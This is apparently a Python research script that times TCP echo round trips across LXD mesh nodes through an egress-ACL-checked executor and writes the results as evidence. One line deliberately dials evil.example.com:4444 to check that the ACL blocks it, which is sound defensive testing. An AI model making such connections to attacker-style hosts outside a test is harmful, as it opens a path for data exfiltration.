"""N2-rest: native TCP frames across real mesh nodes.

A TCP echo server runs inside LXD node np-node2; the host-side pod's
NativeCommExecutor executes DIAL/SEND/RECV/CLOSE frames against it over
the container network — real sockets, real addresses, ACL-checked.
30 round trips; latency and integrity measured.
"""
import base64
import hashlib
import json
import sys
import time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))
from neural_pods.native_comm import EgressACL, NativeCommExecutor
from research.evidence import write as write_evidence

#: The modules these numbers are evidence ABOUT.
SUBJECT = ["neural_pods/native_comm.py"]  # noqa: E402

PEER_NODE = "np-node2"
ECHO_PORT = 45779
ROUNDS = 30

PEER_CODE = None  # echo server is research/echo_server.py

def percentile(values: list[float], p: float) -> float | None:
    """None for an empty sample: the gate must be able to tell "fast" from
    "never measured"."""
    if not values:
        return None
    ordered = sorted(values)
    return round(ordered[min(len(ordered) - 1, int(len(ordered) * p))], 2)


def summarise(*, rounds: int, integrity_ok: int, refused_or_invalid: int,
              rtts: list[float], forbidden_refused: int,
              executor_stats: dict | None = None) -> dict:
    """Turn the observations into the evidence the gate reads. Pure.

    `status` is "completed" only when EVERY round came back byte-identical.
    A partial run is "degraded" and the gate rejects it — the count alone
    would otherwise read as a smaller but successful experiment.
    """
    return {
        "status": "completed" if integrity_ok == rounds and rounds > 0 else "degraded",
        "rounds": rounds,
        "integrity_ok": integrity_ok,
        "refused_or_invalid": refused_or_invalid,
        # The ACL must refuse the forbidden target. `>= 1` rather than a
        # boolean the caller passes in: the count is the observation.
        "acl_blocked_forbidden": forbidden_refused >= 1,
        "acl_refusals": forbidden_refused,
        "rtt_p50_ms": percentile(rtts, 0.5),
        "rtt_p99_ms": percentile(rtts, 0.99),
        "executor_stats": executor_stats or {},
    }


def main() -> None:
    # Start the echo server inside np-node2.
    subprocess_run = __import__("subprocess").run
    subprocess_run(["lxc", "exec", PEER_NODE, "--", "pkill", "-f", "4577"],
                   capture_output=True)
    subprocess_run(["lxc", "exec", PEER_NODE, "--", "bash", "-c",
                    f"setsid nohup {sys.executable} /home/xrey/neural-pods/research/echo_server.py "
                    f"> /tmp/echo-server.log 2>&1 < /dev/null &"],
                   check=True)
    time.sleep(2)

    acl = EgressACL(topics=("np/reader/answer",), hosts=("10.50.0.153",), ports=(ECHO_PORT,))
    executor = NativeCommExecutor(mesh=None, acl=acl)

    rtts = []
    integrity_ok = 0
    refused = 0
    for i in range(ROUNDS):
        payload = f"frame-{i}:{hashlib.sha256(str(i).encode()).hexdigest()[:8]}".encode()
        b64 = base64.b64encode(payload).decode()
        start = time.perf_counter()
        result = executor.execute(f"DIAL 10.50.0.153:{ECHO_PORT}\n"
                                  f"SEND {b64}\nRECV\nCLOSE\n")
        elapsed = (time.perf_counter() - start) * 1000
        refused += result.refused + result.invalid
        if result.recv_data and result.recv_data[0].encode() == payload:
            integrity_ok += 1
            rtts.append(elapsed)
        time.sleep(0.05)
    forbidden = executor.execute(
        f"DIAL evil.example.com:4444\nSEND {base64.b64encode(b'x').decode()}\n")
    result = summarise(rounds=ROUNDS, integrity_ok=integrity_ok,
                       refused_or_invalid=refused, rtts=rtts,
                       forbidden_refused=acl.violations,
                       executor_stats=executor.stats())
    write_evidence(result, Path("research/runs/native-tcp-cross-20260920.json"),
                   __file__, subject=SUBJECT)
    print(json.dumps(result, indent=2))


if __name__ == "__main__":
    main()
